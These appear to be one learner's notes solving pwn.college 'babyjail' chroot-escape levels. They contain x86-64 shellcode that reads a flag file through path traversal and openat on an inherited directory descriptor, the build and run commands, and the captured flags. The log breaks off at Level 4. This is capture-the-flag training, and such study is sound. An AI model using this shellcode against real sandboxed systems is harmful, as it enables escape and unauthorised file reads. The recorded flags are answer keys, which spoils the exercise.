gcc -nostdlib -static -o solve.elf solve.s && objcopy --dump-section .text=solve.bin solve.elf && objdump -M intel -d solve.elf

## Level1
cd /challenge
./babyjail ../flag
pwn.college{IJR79fu7Rg_4xjdyQ10c_k9_vIy.0VMzIDLwIzW}

## Level2
```
.global _start
.intel_syntax noprefix
_start:
# open
	mov rsi, 0
	lea rdi, [rip+flag]
	mov rax, 2 
	syscall
# read
	mov rdi, rax
	mov rsi, rsp
	mov rdx, 100
	mov rax, 0
	syscall
# write
	mov rdi, 1
	mov rsi, rsp
	mov rdx, rax 
	mov rax, 1
	syscall
# exit
	mov rax, 60
	mov rdi, 42
	syscall
flag:
	.ascii "../../flag\0"
```
/challenge/babyjail_level2 ../../etc/passwd < ~/solve.bin
pwn.college{AI9gyQ8BzVrTbEsvZ8gEQ7OjMXV.0lMzIDLwIzW}

## Level3
use openat for solve.s
openat(int dirfd, const char *pathname, int flags, mode_t mode)
```
# openat
	mov rdx, 0
	lea rsi, [rip+flag]
	mov rdi, 3
	mov rax, 257 
	syscall

#flag\0
```
/challenge/babyjail_level3 / < solve.bin
pwn.college{wlSdZaMKZvhhuPDQVlR7yapeFct.01MzIDLwIzW}

## Level4
